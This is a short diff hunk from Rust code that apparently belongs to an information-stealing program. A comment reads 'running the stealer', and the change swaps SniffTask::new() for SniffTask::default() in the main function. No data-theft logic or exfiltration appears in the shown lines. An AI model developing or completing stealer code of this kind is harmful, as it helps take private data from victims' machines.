@@ -235,7 +235,7 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     let _ = fs.mkdir(&out);
   
     // running the stealer
-    SniffTask::new().run(&out, &fs, &collector);
+    SniffTask::default().run(&out, &fs, &collector);
 
     let displayed_collector = format!("{}", DisplayCollector(collector));
 
